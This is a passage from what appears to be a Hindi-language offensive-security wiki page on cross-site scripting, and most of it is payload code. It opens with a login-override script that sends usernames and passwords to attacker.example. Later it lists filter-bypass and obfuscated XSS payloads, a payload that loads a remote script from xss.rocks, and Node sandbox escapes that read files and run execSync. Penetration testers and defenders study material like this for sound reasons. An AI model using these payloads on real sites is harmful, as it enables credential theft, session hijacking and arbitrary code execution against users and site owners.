s.textContent = "const DoLogin = () => {const pwd = Trim(FormInput.InputPassword.value); const user = Trim(FormInput.InputUtente.value); fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));}";
document.head.appendChild(s);
```
संदर्भ: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval

### Unicode एन्कोड JS निष्पादन
```javascript
alert(1)
alert(1)
alert(1)
```
### JavaScript bypass blacklists तकनीकें

**Strings**
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```
**विशेष एस्केप्स**
```javascript
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
// Any other char escaped is just itself
```
**JS कोड के अंदर स्पेस का प्रतिस्थापन**
```javascript
<TAB>
/**/
```
**JavaScript comments (से** [**JavaScript Comments**](#javascript-comments) **ट्रिक)**
```javascript
//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
-->This is a 1 line comment, but "-->" must to be at the beggining of the first line
```
**JavaScript new lines (से** [**JavaScript new line**](#javascript-new-lines) **ट्रिक)**
```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10)
alert("//\nalert(1)") //0x0a
String.fromCharCode(13)
alert("//\ralert(1)") //0x0d
String.fromCharCode(8232)
alert("//\u2028alert(1)") //0xe2 0x80 0xa8
String.fromCharCode(8233)
alert("//\u2029alert(1)") //0xe2 0x80 0xa9
```
**JavaScript व्हाइटस्पेस**
```javascript
log=[];
function funct(){}
for(let i=0;i<=0x10ffff;i++){
try{
eval(`funct${String.fromCodePoint(i)}()`);
log.push(i);
}
catch(e){}
}
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
<img/src/onerror=alert&#65279;(1)>
```
**Javascript टिप्पणी के अंदर**
```javascript
//If you can only inject inside a JS comment, you can still leak something
//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```
**JavaScript कोष्ठकों के बिना**
```javascript
// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
// or any DOMXSS sink such as location=name

// Backtips
// Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

// To pass several arguments you can use
function btt(){
console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//It's possible to construct a function and call it
Function`x${'alert(1337)'}x`

// .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
// This happened in the previous example
// Change "this" value of call to "1,"
// match anything with regex /./
// call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

// Using Reflect.apply to call any function with any argumnets
Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
// Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



// valueOf, toString
// These operations are called when the object is used as a primitive
// Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
// The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
// The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.

```
- [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
- [https://portswigger.net/research/javascript-without-parentheses-using-dommatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

**मनमाना फ़ंक्शन (alert) कॉल**
```javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>
```
## **DOM vulnerabilities**

There is **JS code** that is using **unsafely data controlled by an attacker** like `location.href` . An attacker, could abuse this to execute arbitrary JS code.\
**व्याख्या के विस्तार के कारण** [**DOM vulnerabilities it was moved to this page**](dom-xss.md)**:**

{{#ref}}
dom-xss.md
{{#endref}}

वहाँ आपको विस्तृत **विवरण मिलेगा कि DOM vulnerabilities क्या हैं, ये कैसे उत्पन्न होते हैं, और इन्हें कैसे exploit किया जा सकता है**।\
इसके अलावा, मत भूलिए कि **उक्त पोस्ट के अंत में** आप [**DOM Clobbering attacks**](dom-xss.md#dom-clobbering) के बारे में व्याख्या पा सकते हैं।

### Upgrading Self-XSS

### Cookie XSS

If you can trigger a XSS by sending the payload inside a cookie, this is usually a self-XSS. However, if you find a **vulnerable subdomain to XSS**, you could abuse this XSS to inject a cookie in the whole domain managing to trigger the cookie XSS in the main domain or other subdomains (the ones vulnerable to cookie XSS). For this you can use the cookie tossing attack:


{{#ref}}
../hacking-with-cookies/cookie-tossing.md
{{#endref}}

इस तकनीक के उपयोग का एक शानदार उदाहरण आप [**this blog post**](https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html) में पा सकते हैं।

### Sending your session to the admin

Maybe an user can share his profile with the admin and if the self XSS is inside the profile of the user and the admin access it, he will trigger the vulnerability.

शायद एक user अपना profile admin के साथ साझा कर सकता है और यदि user के profile में self XSS मौजूद है और admin इसे access करता है, तो वह vulnerability को trigger कर देगा।

### Session Mirroring

If you find some self XSS and the web page have a **session mirroring for administrators**, for example allowing clients to ask for help an in order for the admin to help you he will be seeing what you are seeing in your session but from his session.

यदि आप कुछ self XSS पाते हैं और web page में administrators के लिए **session mirroring** मौजूद है, उदाहरण के लिए clients को मदद माँगने की अनुमति देना और admin आपकी मदद करने के लिए आपके session में जो देख रहे हैं वही अपने session से देख पाएगा।

You could make the **administrator trigger your self XSS** and steal his cookies/session.

आप **administrator को अपना self XSS trigger करने के लिए मजबूर** कर सकते हैं और उसकी cookies/session चुरा सकते हैं।

## Other Bypasses

### Normalised Unicode

You could check is the **reflected values** are being **unicode normalized** in the server (or in the client side) and abuse this functionality to bypass protections. [**Find an example here**](../unicode-injection/index.html#xss-cross-site-scripting).

आप यह जांच सकते हैं कि क्या **reflected values** server (या client side) पर **unicode normalized** किए जा रहे हैं और इस फंक्शनालिटी का दुरुपयोग कर के protections को bypass कर सकते हैं। [**Find an example here**](../unicode-injection/index.html#xss-cross-site-scripting).

### PHP FILTER_VALIDATE_EMAIL flag Bypass
```javascript
"><svg/onload=confirm(1)>"@x.y
```
### Ruby-On-Rails bypass

इसके कारण **RoR mass assignment** के चलते HTML में quotes डाले जाते हैं और quote restriction को bypass किया जा सकता है, जिससे अतिरिक्त फ़ील्ड (onfocus) टैग के अंदर जोड़े जा सकते हैं.\
फ़ॉर्म का उदाहरण ([from this report](https://hackerone.com/reports/709336)), अगर आप payload भेजते हैं:
```
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```
"Key","Value" की जोड़ी इस तरह echoed back की जाएगी:
```
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}
```
फिर, onfocus attribute सम्मिलित किया जाएगा और XSS हो जाएगा।

### विशेष संयोजन
```html
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
(function(x){this[x+`ert`](1)})`al`
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
document['default'+'View'][`\u0061lert`](3)
```
### 302 response में header injection के साथ XSS

यदि आप पाते हैं कि आप **302 Redirect response में headers inject** कर सकते हैं तो आप कोशिश कर सकते हैं कि **browser को arbitrary JavaScript execute करवा दें**। यह **सरल नहीं है** क्योंकि modern browsers HTTP response body को interpret नहीं करते जब HTTP response status code 302 हो, इसलिए सिर्फ एक cross-site scripting payload बेकार है।

In [**this report**](https://www.gremwell.com/firefox-xss-302) and [**this one**](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/) you can read how you can test several protocols inside the Location header and see if any of them allows the browser to inspect and execute the XSS payload inside the body.\
Past known protocols: `mailto://`, `//x:1/`, `ws://`, `wss://`, _empty Location header_, `resource://`.

### केवल अक्षर, अंक और डॉट्स

यदि आप उन कैरेक्टर्स तक सीमित वह **callback** निर्दिष्ट कर सकते हैं जिसे javascript **execute** करेगा, तो [**Read this section of this post**](#javascript-function) पढ़िए ताकि पता चले इस व्यवहार का दुरुपयोग कैसे किया जा सकता है।

### XSS के लिए मान्य `<script>` Content-Types

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) यदि आप किसी script को ऐसे **content-type** के साथ लोड करने की कोशिश करते हैं जैसे `application/octet-stream`, तो Chrome निम्न त्रुटि दिखाएगा:

> Refused to execute script from ‘[https://uploader.c.hc.lc/uploads/xxx'](https://uploader.c.hc.lc/uploads/xxx') because its MIME type (‘application/octet-stream’) is not executable, and strict MIME type checking is enabled.

एकमात्र **Content-Type**s जो Chrome को एक **loaded script** चलाने में सक्षम करेंगे, वे वे हैं जो const **`kSupportedJavascriptTypes`** के अंदर सूचीबद्ध हैं, from https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc
```c
const char* const kSupportedJavascriptTypes[] = {
"application/ecmascript",
"application/javascript",
"application/x-ecmascript",
"application/x-javascript",
"text/ecmascript",
"text/javascript",
"text/javascript1.0",
"text/javascript1.1",
"text/javascript1.2",
"text/javascript1.3",
"text/javascript1.4",
"text/javascript1.5",
"text/jscript",
"text/livescript",
"text/x-ecmascript",
"text/x-javascript",
};

```
### XSS के लिए script प्रकार

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) तो, कौन से प्रकार script लोड करने के लिए इंगित किए जा सकते हैं?
```html
<script type="???"></script>
```
उत्तर:

- **module** (डिफ़ॉल्ट, समझाने की आवश्यकता नहीं)
- [**webbundle**](https://web.dev/web-bundles/): Web Bundles एक ऐसी सुविधा है जो आपको HTML, CSS, JS… जैसी कई सामग्री को एक साथ एक **`.wbn`** फ़ाइल में पैकेज करने देती है।
```html
<script type="webbundle">
{
"source": "https://example.com/dir/subresources.wbn",
"resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
The resources are loaded from the source .wbn, not accessed via HTTP
```
- [**importmap**](https://github.com/WICG/import-maps)**:** import syntax को सुधारने की अनुमति देता है
```html
<script type="importmap">
{
"imports": {
"moment": "/node_modules/moment/src/moment.js",
"lodash": "/node_modules/lodash-es/lodash.js"
}
}
</script>

<!-- With importmap you can do the following -->
<script>
import moment from "moment"
import { partition } from "lodash"
</script>
```
This behaviour was used in [**this writeup**](https://github.com/zwade/yaca/tree/master/solution) to remap a library to eval to abuse it can trigger XSS।

- [**speculationrules**](https://github.com/WICG/nav-speculation)**:** यह विशेषता मुख्यतः pre-rendering से होने वाली कुछ समस्याओं को हल करने के लिए है। यह इस प्रकार काम करता है:
```html
<script type="speculationrules">
{
"prerender": [
{ "source": "list", "urls": ["/page/2"], "score": 0.5 },
{
"source": "document",
"if_href_matches": ["https://*.wikipedia.org/**"],
"if_not_selector_matches": [".restricted-section *"],
"score": 0.1
}
]
}
</script>
```
### वेब Content-Types से XSS

(स्रोत: [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) निम्नलिखित Content-Types सभी ब्राउज़रों में XSS चला सकते हैं:

- text/html
- application/xhtml+xml
- application/xml
- text/xml
- image/svg+xml
- text/plain (?? not in the list but I think I saw this in a CTF)
- application/rss+xml (off)
- application/atom+xml (off)

अन्य ब्राउज़रों में अन्य **`Content-Types`** मनमाना JS चलाने के लिए उपयोग किए जा सकते हैं, देखें: [https://github.com/BlackFan/content-type-research/blob/master/XSS.md](https://github.com/BlackFan/content-type-research/blob/master/XSS.md)

### xml Content Type

यदि पेज text/xml content-type लौटाता है तो namespace निर्दिष्ट करके मनमाना JS चलाया जा सकता है:
```xml
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->
```
### विशेष प्रतिस्थापन पैटर्न

जब कुछ ऐसा उपयोग किया जाता है: **`"some {{template}} data".replace("{{template}}", <user_input>)`**। एक attacker कुछ सुरक्षा उपायों को बायपास करने के लिए [**special string replacements**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#specifying_a_string_as_the-replacement) का उपयोग कर सकता है: `` "123 {{template}} 456".replace("{{template}}", JSON.stringify({"name": "$'$`alert(1)//"})) ``

उदाहरण के लिए, [**this writeup**](https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA) में, इसका उपयोग स्क्रिप्ट के अंदर एक JSON string को escape करने और arbitrary code execute करने के लिए किया गया था।

### Chrome Cache to XSS


{{#ref}}
chrome-cache-to-xss.md
{{#endref}}

### XS Jails Escape

यदि आपके पास उपयोग करने के लिए केवल सीमित वर्ण सेट हैं, तो XSJail समस्याओं के लिए इन अन्य मान्य समाधानों को देखें:
```javascript
// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/index.html)with(this)with(constructor)constructor(source)()
// Just replace console.log(1) to the real code, the code we want to run is:
//return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//Final solution
with(
/with(String)
with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)
with(require(k))
return(String(readFileSync(n)))
/)
with(this)
with(constructor)
constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
```
यदि untrusted code को execute करने से पहले **सब कुछ undefined है** (जैसे [**this writeup**](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/index.html#miscx2fundefined55-solves)) तो arbitrary untrusted code के execution का दुरुपयोग करने के लिए "कुछ भी नहीं" से उपयोगी objects जनरेट करना संभव है:

- Using import()
```javascript
// although import "fs" doesn’t work, import('fs') does.
import("fs").then((m) => console.log(m.readFileSync("/flag.txt", "utf8")))
```
- अप्रत्यक्ष रूप से `require` तक पहुँच

[According to this](https://stackoverflow.com/questions/28955047/why-does-a-module-level-return-statement-work-in-node-js/28955050#28955050) Node.js मॉड्यूल्स को एक function के भीतर लपेटता है, कुछ इस तरह:
```javascript
;(function (exports, require, module, __filename, __dirname) {
// our actual module code
})
```
इसलिए, यदि उस मॉड्यूल से हम **किसी अन्य फ़ंक्शन को कॉल कर सकें**, तो उस फ़ंक्शन से `arguments.callee.caller.arguments[1]` का उपयोग करके **`require`** तक पहुँच संभव है:
```javascript
;(function () {
return arguments.callee.caller.arguments[1]("fs").readFileSync(
"/flag.txt",
"utf8"
)
})()
```
पिछले उदाहरण की तरह, यह संभव है कि **use error handlers** की मदद से मॉड्यूल के **wrapper** तक पहुँच कर **`require`** फ़ंक्शन प्राप्त किया जा सके:
```javascript
try {
null.f()
} catch (e) {
TypeError = e.constructor
}
Object = {}.constructor
String = "".constructor
Error = TypeError.prototype.__proto__.constructor
function CustomError() {
const oldStackTrace = Error.prepareStackTrace
try {
Error.prepareStackTrace = (err, structuredStackTrace) =>
structuredStackTrace
Error.captureStackTrace(this)
this.stack
} finally {
Error.prepareStackTrace = oldStackTrace
}
}
function trigger() {
const err = new CustomError()
console.log(err.stack[0])
for (const x of err.stack) {
// use x.getFunction() to get the upper function, which is the one that Node.js adds a wrapper to, and then use arugments to get the parameter
const fn = x.getFunction()
console.log(String(fn).slice(0, 200))
console.log(fn?.arguments)
console.log("=".repeat(40))
if ((args = fn?.arguments)?.length > 0) {
req = args[1]
console.log(req("child_process").execSync("id").toString())
}
}
}
trigger()
```
### Obfuscation & Advanced Bypass

- **एक पेज में विभिन्न obfuscations:** [**https://aem1k.com/aurebesh.js/**](https://aem1k.com/aurebesh.js/)
- [https://github.com/aemkei/katakana.js](https://github.com/aemkei/katakana.js)
- [https://javascriptobfuscator.herokuapp.com/](https://javascriptobfuscator.herokuapp.com)
- [https://skalman.github.io/UglifyJS-online/](https://skalman.github.io/UglifyJS-online/)
- [http://www.jsfuck.com/](http://www.jsfuck.com)
- JSFuck के अधिक परिष्कृत तरीके: [https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce](https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)
- [http://utf-8.jp/public/jjencode.html](http://utf-8.jp/public/jjencode.html)
- [https://utf-8.jp/public/aaencode.html](https://utf-8.jp/public/aaencode.html)
- [https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
```javascript
//Katana
<script>
([,ウ,,,,ア]=[]+{}
,[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
</script>
```

```javascript
//JJencode
<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
```

```javascript
//JSFuck
<script>
(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()
</script>
```

```javascript
//aaencode
ﾟωﾟﾉ = /｀ｍ´）ﾉ ~┻━┻   / /*´∇｀*/["_"]
o = ﾟｰﾟ = _ = 3
c = ﾟΘﾟ = ﾟｰﾟ - ﾟｰﾟ
ﾟДﾟ = ﾟΘﾟ = (o ^ _ ^ o) / (o ^ _ ^ o)
ﾟДﾟ = {
ﾟΘﾟ: "_",
ﾟωﾟﾉ: ((ﾟωﾟﾉ == 3) + "_")[ﾟΘﾟ],
ﾟｰﾟﾉ: (ﾟωﾟﾉ + "_")[o ^ _ ^ (o - ﾟΘﾟ)],
ﾟДﾟﾉ: ((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ],
}
ﾟДﾟ[ﾟΘﾟ] = ((ﾟωﾟﾉ == 3) + "_")[c ^ _ ^ o]
